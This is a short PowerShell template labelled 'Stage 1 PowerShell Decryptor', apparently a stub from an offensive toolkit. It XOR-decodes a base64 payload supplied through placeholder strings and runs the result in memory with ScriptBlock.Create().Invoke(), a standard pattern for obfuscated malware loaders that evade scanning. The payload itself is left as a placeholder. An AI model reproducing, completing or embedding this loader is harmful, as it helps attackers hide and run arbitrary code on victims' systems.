# Stage 1 PowerShell Decryptor (template.ps1)
# Replaces: REPLACE_KEY:REPLACE_BASE64
$parts = "REPLACE_KEY:REPLACE_BASE64" -split ":"
$key = [int]$parts[0]
$enc = [System.Convert]::FromBase64String($parts[1])
$decoded = for ($i=0; $i -lt $enc.Length; $i++) { $enc[$i] -bxor $key }
$script = [System.Text.Encoding]::UTF8.GetString($decoded)
[ScriptBlock]::Create($script).Invoke()
